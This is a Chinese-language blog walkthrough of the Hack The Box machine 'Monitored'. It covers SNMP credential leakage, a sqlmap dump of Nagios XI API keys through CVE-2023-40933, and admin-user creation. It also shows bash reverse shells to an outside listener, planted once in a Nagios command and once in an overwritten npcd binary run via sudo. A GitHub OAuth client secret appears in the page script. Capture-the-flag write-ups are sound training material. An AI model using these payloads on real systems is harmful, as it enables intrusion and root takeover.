<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>Monitored - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Hackthebox">
    <meta name="description" content="靶场信息  信息收集Nmap┌──(root㉿kali)-[~&#x2F;Desktop] └─# nmap -sC -sV -A -p- --min-rate&#x3D;10000 10.10.11.248 Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2024-01-16 15:56 CST Nmap scan report for 10.10.11.248 Host is">
<meta property="og:type" content="article">
<meta property="og:title" content="Monitored - Hackthebox">
<meta property="og:url" content="http://www.lucifiel.com/2024/01/16/Hackthebox/Medium/Monitored-Hackthebox/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="靶场信息  信息收集Nmap┌──(root㉿kali)-[~&#x2F;Desktop] └─# nmap -sC -sV -A -p- --min-rate&#x3D;10000 10.10.11.248 Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2024-01-16 15:56 CST Nmap scan report for 10.10.11.248 Host is">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2024/01/16/Hackthebox/Medium/Monitored-Hackthebox/Monitored.png">
<meta property="og:image" content="http://www.lucifiel.com/2024/01/16/Hackthebox/Medium/Monitored-Hackthebox/image-20240116160504272.png">
<meta property="og:image" content="http://www.lucifiel.com/2024/01/16/Hackthebox/Medium/Monitored-Hackthebox/image-20240116160516851.png">
<meta property="og:image" content="http://www.lucifiel.com/2024/01/16/Hackthebox/Medium/Monitored-Hackthebox/image-20240116170623237.png">
<meta property="og:image" content="http://www.lucifiel.com/2024/01/16/Hackthebox/Medium/Monitored-Hackthebox/image-20240120022403314.png">
<meta property="og:image" content="http://www.lucifiel.com/2024/01/16/Hackthebox/Medium/Monitored-Hackthebox/image-20240120023614692.png">
<meta property="og:image" content="http://www.lucifiel.com/2024/01/16/Hackthebox/Medium/Monitored-Hackthebox/image-20240120023355180.png">
<meta property="article:published_time" content="2024-01-16T07:57:25.000Z">
<meta property="article:modified_time" content="2025-02-24T08:40:48.021Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Hackthebox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2024/01/16/Hackthebox/Medium/Monitored-Hackthebox/Monitored.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://www.buymeacoffee.com/lucifiel" target="_blank" >
                <i class="icon icon-lg icon-coffee"></i>
                请我喝咖啡
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Monitored - Hackthebox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Monitored - Hackthebox</h1>
        <h5 class="subtitle">
            
                <time datetime="2024-01-16T07:57:25.000Z" itemprop="datePublished" class="page-time">
  2024-01-16
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息收集"><span class="post-toc-text">信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap-UDP"><span class="post-toc-text">Nmap UDP</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a></li></ol>
        </nav>
    </aside>


<article id="post-Hackthebox/Medium/Monitored-Hackthebox"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Monitored - Hackthebox</h1>
        <div class="post-meta">
            <time class="post-time" title="2024-01-16 15:57:25" datetime="2024-01-16T07:57:25.000Z"  itemprop="datePublished">2024-01-16</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><img src="/2024/01/16/Hackthebox/Medium/Monitored-Hackthebox/Monitored.png" class title="Monitored">

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code>┌──(root㉿kali)-[~/Desktop]
└─# nmap -sC -sV -A -p- --min-rate=10000 10.10.11.248
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-16 15:56 CST
Nmap scan report for 10.10.11.248
Host is up (0.084s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 61e2e7b41b5d46dc3b2f9138e66dc5ff (RSA)
|   256 2973c5a58daa3f60a94aa3e59f675c93 (ECDSA)
|_  256 6d7af9eb8e45c2026ad58d4db3a3376f (ED25519)
80/tcp   open  http       Apache httpd 2.4.56
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
|_http-server-header: Apache/2.4.56 (Debian)
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.56 ((Debian))
|_http-title: Nagios XI
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
| Not valid before: 2023-11-11T21:46:55
|_Not valid after:  2297-08-25T21:46:55
|_http-server-header: Apache/2.4.56 (Debian)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
5667/tcp open  tcpwrapped
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=1/16%OT=22%CT=1%CU=35962%PV=Y%DS=2%DC=T%G=Y%TM=65A636D
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST1
OS:1NW7%O6=M537ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   132.11 ms 10.10.16.1
2   83.83 ms  10.10.11.248

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.12 seconds
</code></pre>
<h2 id="Nmap-UDP"><a href="#Nmap-UDP" class="headerlink" title="Nmap UDP"></a>Nmap UDP</h2><p>UDP的扫描结果过多，我会删除掉无用信息，大家有需要的可以自己扫描一次</p>
<pre><code>┌──(root㉿kali)-[~/Desktop]
└─# nmap -sC -sV -sU -T4 -Pn 10.10.11.248
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-16 16:28 CST
Nmap scan report for nagios.monitored.htb (10.10.11.248)
Host is up (0.081s latency).
Not shown: 982 closed udp ports (port-unreach)
PORT      STATE         SERVICE      VERSION
68/udp    open|filtered dhcpc
123/udp   open          ntp          NTP v4 (unsynchronized)
| ntp-info: 
|_  
161/udp   open          snmp         SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-processes:
|   596: 
|     Name: sh
|     Path: /bin/sh
|     Params: -c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB 
|   622: 
|     Name: dhclient
|     Path: /sbin/dhclient
|     Params: -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
|   833: 
|     Path: /usr/bin/shellinaboxd
|     Params: -q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit
|   860: 
|     Path: /usr/lib/postgresql/13/bin/postgres
|     Params: -D /var/lib/postgresql/13/main -c config_file=/etc/postgresql/13/main/postgresql.conf
|   1408: 
|     Path: sudo
|     Params: -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB
|   1409: 
|     Path: /bin/bash
|     Params: -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB
| snmp-netstat: 
|   TCP  0.0.0.0:22           0.0.0.0:0
|   TCP  0.0.0.0:389          0.0.0.0:0
|   TCP  10.10.11.248:58046   10.10.16.18:9001
|   TCP  127.0.0.1:25         0.0.0.0:0
|   TCP  127.0.0.1:3306       0.0.0.0:0
|   TCP  127.0.0.1:5432       0.0.0.0:0
|   TCP  127.0.0.1:7878       0.0.0.0:0
|   TCP  127.0.0.1:47254      127.0.1.1:80
|   TCP  127.0.0.1:47268      127.0.1.1:80
|   UDP  0.0.0.0:68           *:*
|   UDP  0.0.0.0:123          *:*
|   UDP  0.0.0.0:161          *:*
|   UDP  0.0.0.0:162          *:*
|   UDP  10.10.11.248:123     *:*
|_  UDP  127.0.0.1:123        *:*
162/udp   open          snmp         net-snmp; net-snmp SNMPv3 server
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 5a44ab2146ff4c6500000000
|   snmpEngineBoots: 26
|_  snmpEngineTime: 3h42m19s
Service Info: Host: monitored

Host script results:
|_clock-skew: 5s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1405.47 seconds
</code></pre>
<pre><code>svc
XjH7VCehowpR1xZB
</code></pre>
<p>似乎是一个账号密码</p>
<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><p>添加一个 hosts 解析</p>
<pre><code>echo &quot;10.10.11.248 nagios.monitored.htb monitored.htb&quot; &gt;&gt; /etc/hosts
</code></pre>
<img src="/2024/01/16/Hackthebox/Medium/Monitored-Hackthebox/image-20240116160504272.png" class title="image-20240116160504272">

<img src="/2024/01/16/Hackthebox/Medium/Monitored-Hackthebox/image-20240116160516851.png" class title="image-20240116160516851">

<p>这是一个Nagios XI，我们刚才在UDP的walk中得到了一个账号密码，去登录试试</p>
<img src="/2024/01/16/Hackthebox/Medium/Monitored-Hackthebox/image-20240116170623237.png" class title="image-20240116170623237">

<p>提示账户已被禁用或不存在，目前没别的思路，所以我怀疑可能不是这个登录点，去扫个目录看看</p>
<blockquote>
<p><a href="https://support.nagios.com/forum/viewtopic.php?f=16&amp;t=58783" target="_blank" rel="noopener">https://support.nagios.com/forum/viewtopic.php?f=16&amp;t=58783</a></p>
</blockquote>
<p>在官方论坛上面，我们得到了一个api路径<code>nagiosxi/api/v1/authenticate</code> </p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>去请求一下</p>
<pre><code>┌──(root㉿kali)-[~/Desktop]
└─# curl -k https://nagios.monitored.htb/nagiosxi/api/v1/authenticate                                                                                  
{&quot;error&quot;:&quot;You can only use POST with authenticate.&quot;}
</code></pre>
<p>需要POST方式请求</p>
<pre><code>┌──(root㉿kali)-[~/Desktop]
└─# curl -k -X POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate                                       
{&quot;error&quot;:&quot;Must be valid username and password.&quot;}
</code></pre>
<p>nice，这里让我们代入账号密码了</p>
<pre><code>┌──(root㉿kali)-[~/Desktop]
└─# curl -k -X POST -d &#39;username=svc&amp;password=XjH7VCehowpR1xZB&#39; https://nagios.monitored.htb/nagiosxi/api/v1/authenticate
{&quot;username&quot;:&quot;svc&quot;,&quot;user_id&quot;:&quot;2&quot;,&quot;auth_token&quot;:&quot;245472399b3edb68e8ff0acfb94f058c21cf6fd8&quot;,&quot;valid_min&quot;:5,&quot;valid_until&quot;:&quot;Fri, 19 Jan 2024 12:50:27 -0500&quot;}
</code></pre>
<p>得到了一个token</p>
<pre><code>245472399b3edb68e8ff0acfb94f058c21cf6fd8
</code></pre>
<blockquote>
<p><a href="https://support.nagios.com/forum/viewtopic.php?f=16&amp;t=42923" target="_blank" rel="noopener">https://support.nagios.com/forum/viewtopic.php?f=16&amp;t=42923</a></p>
</blockquote>
<p>找到了一篇使用apikey来添加新用户的文章，但我们目前没有apikey，想想办法搞一个apikey</p>
<blockquote>
<p><a href="https://outpost24.com/blog/nagios-xi-vulnerabilities/?source=post_page-----cc2d7b64da35--------------------------------" target="_blank" rel="noopener">https://outpost24.com/blog/nagios-xi-vulnerabilities/?source=post_page-----cc2d7b64da35--------------------------------</a></p>
</blockquote>
<p>找到了一篇漏洞，CVE-2023-40933 一个sql注入</p>
<pre><code>┌──(root㉿kali)-[~/Desktop]
└─# sqlmap -u &quot;https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=2&amp;token=245472399b3edb68e8ff0acfb94f058c21cf6fd8&quot; --batch -p id --level 5 --risk 3 -D nagiosxi -T xi_users -C user_id,email,name,api_key --dump

Database: nagiosxi
Table: xi_users
[14 entries]
+---------+----------------------+------------------------+------------------------------------------------------------------+
| user_id | name                 | email                  | api_key                                                          |
+---------+----------------------+------------------------+------------------------------------------------------------------+
| 1       | Nagios Administrator | admin@monitored.htb    | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL |
| 2       | svc                  | svc@monitored.htb      | 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK |
| 6       | Amit R               | ar7@localhost          | KCo0kXK6f4R5774Iu6ADo9IsDWq4MsYr6bHGn98A3JPhUWoFdOSGm0P9XXeKdJJk |
| 7       | test                 | test@localhost         | OMrovDTjdUO3fgtofjJ4f6GkLntOh0iBFtJDLidQpBN27aeKfihpIXneTCrbPkJ4 |
| 8       | test                 | test@localhost         | UjEmNqRnca3YPaI3VYJ0rsBVTZqjdQSGOc5bHDgJvlpngEVlpPXUHstSGC9UOEQT |
| 9       | test                 | test@localhost         | 3vlR5KpI3qn6dj99vqglaiZNfO55NgXHOvjhXf5lo2gKXcnGFGNX7PHYXN5IsVrD |
| 10      | xxx                  | xxx@xxx.com            | v0OATXpVlabieTXlRZ4cPGjgRQtlGWOvoi98PdctWQpsAU2BBe0fWAIUm2MKIclh |
| 12      | myadmin              | myadmin@localhost      | RBNeidWOeFjW6BTEDIBCi8v7Hkmq4bTKQEpcQGCImbKlvSWZ3aACFAZscNCOENNh |
| 13      | xxx                  | xxx@xxx.com            | CPpCPuP2tp3QanriSSF27CH43OaS4bIqOs7LoX0h9oe33rN25UVcUr9GCB6gTuRn |
| 14      | cyber                | cyber@localhost        | CRGet0kN9vSfXtglKejcdQsRSOqZZkdgYZG6hi2F5Hm948fC9dfsaHrfuq90Ue9S |
| 15      | test                 | test@localhost         | lipOSdnvaogYouWA46uHUnQh639uMK5DE3OhfpJUGpjnn38P0jobIJbHBbJI0QVR |
| 16      | tooltoulto           | tooltoulto@test.htb    | vlATLMas78mgMJNZXXtJE4H4aAbZtTbf9IYHXYHUkXW5Rqa3dYWECX8No3rBGF7s |
| 17      | testadmin            | test@mail.com          | SZ6WBLotJYoV6XEVn2Aa6Z6ShWMFdLMLQf4GQbqoJSRYQdYYkmjjd2j808Lcm2Ek |
| 18      | nadmin               | newadmin@monitored.htb | 67WPWGSBgCSVmXqN0e4GhQ9j2Jfnbcv4fDqN46H0uHYjaj5RZE40FJ06ZsubSl0L |
+---------+----------------------+------------------------+------------------------------------------------------------------+
</code></pre>
<p>现在我们有了apikey了，接着去创建一个新用户</p>
<pre><code>┌──(root㉿kali)-[~/Desktop]
└─# curl -X POST -k &quot;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&amp;pretty=1&quot; -d &quot;username=Lucifiel&amp;password=lucifiel123&amp;name=Lucifiel&amp;email=Lucifiel@htb.com&amp;auth_level=admin&quot;
{
    &quot;success&quot;: &quot;User account lucifiel was added successfully!&quot;,
    &quot;user_id&quot;: 19
}
</code></pre>
<p>创建成功，我们去登录一下</p>
<img src="/2024/01/16/Hackthebox/Medium/Monitored-Hackthebox/image-20240120022403314.png" class title="image-20240120022403314">

<p>成功登录，接着依次点击 Configure -&gt; Core Config Manager -&gt; Commands -&gt; Commands -&gt; Add New，创建新命令</p>
<pre><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.19/4444 0&gt;&amp;1&#39;
</code></pre>
<img src="/2024/01/16/Hackthebox/Medium/Monitored-Hackthebox/image-20240120023614692.png" class title="image-20240120023614692">

<p>然后使用 nc 监听端口</p>
<pre><code>nc -nvlp 4444
</code></pre>
<p>接着点击 Quick Tools -&gt; Apply Configuration -&gt; Apply Configuration 来应用我们的配置</p>
<p>然后接着点击 Monitoring -&gt; Server-&gt; Add New-&gt; Run Check Command</p>
<img src="/2024/01/16/Hackthebox/Medium/Monitored-Hackthebox/image-20240120023355180.png" class title="image-20240120023355180">

<pre><code>┌──(root㉿kali)-[~/Desktop]
└─# rlwrap nc -nvlp 4444                             
listening on [any] 4444 ...
connect to [10.10.16.19] from (UNKNOWN) [10.10.11.248] 55738
bash: cannot set terminal process group (100266): Inappropriate ioctl for device
bash: no job control in this shell
nagios@monitored:~$ whoami&amp;&amp;id
whoami&amp;&amp;id
nagios
uid=1001(nagios) gid=1001(nagios) groups=1001(nagios),1002(nagcmd)
</code></pre>
<p>成功获得 user 权限</p>
<pre><code>nagios@monitored:~$ cat user.txt
cat user.txt
cf26b424c7a5d84a9c89b819e60a3468
</code></pre>
<p>成功获得 user 权限的 flag 文件</p>
<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>使用 sudo -l 查看一下权限</p>
<pre><code>nagios@monitored:~$ sudo -l
sudo -l
Matching Defaults entries for nagios on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nagios may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/migrate/migrate.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
</code></pre>
<pre><code>nagios@monitored:~$ ls -la /usr/local/nagiosxi/scripts/manage_services.sh
ls -la /usr/local/nagiosxi/scripts/manage_services.sh
-r-xr-x--- 1 root nagios 3917 Nov  9 10:44 /usr/local/nagiosxi/scripts/manage_services.sh
</code></pre>
<p>这里我们有 npcd 的权限，同时还有 manager_services 的编辑执行权限，那直接把提权语句写入进去就可以了</p>
<pre><code>nagios@monitored:~$ rm /usr/local/nagios/bin/npcd
nagios@monitored:~$ vi /usr/local/nagios/bin/npcd
nagios@monitored:~$ cat /usr/local/nagios/bin/npcd
#!/bin/bash                                                                               bash -i &gt;&amp;/dev/tcp/10.10.16.19/5555 0&gt;&amp;1
nagios@monitored:~$ cd /usr/local/nagios/bin
nagios@monitored:/usr/local/nagios/bin$ chmod +x npcd
nagios@monitored:/usr/local/nagios/bin$ sudo /usr/local/nagiosxi/scripts/manage_services.sh restart npcd
</code></pre>
<p>然后去运行</p>
<pre><code>┌──(root㉿kali)-[~/Desktop]
└─# nc -nvlp 5555                        
listening on [any] 5555 ...
connect to [10.10.16.19] from (UNKNOWN) [10.10.11.248] 34648
bash: cannot set terminal process group (102596): Inappropriate ioctl for device
bash: no job control in this shell
root@monitored:/# whoami&amp;&amp;id
whoami&amp;&amp;id
root
uid=0(root) gid=0(root) groups=0(root)
</code></pre>
<p>成功获得 root 权限</p>
<pre><code>root@monitored:/# cat /root/root.txt
cat /root/root.txt
7a5e91f64064fc96d1fd5214e2856aeb
</code></pre>
<p>成功获得 root 权限的 flag 文件</p>

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2024/01/16/Hackthebox/Medium/Monitored-Hackthebox/&title=《Monitored - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2024/01/16/Hackthebox/Medium/Monitored-Hackthebox/&title=《Monitored - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2024/01/16/Hackthebox/Medium/Monitored-Hackthebox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Monitored - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2024/01/16/Hackthebox/Medium/Monitored-Hackthebox/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2024/01/16/Hackthebox/Medium/Monitored-Hackthebox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2024/01/20/Hackthebox/Hard/Analysis/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Analysis - Hackthebox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2024/01/07/Hackthebox/Easy/Bizness-HackTheBox/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Binzess - Hackthebox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'cf0a9809323df14a9168',
          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
          repo: 'LucifielHack.github.io',
          owner: 'LucifielHack',
          admin: ['LucifielHack'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            <!--- 
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
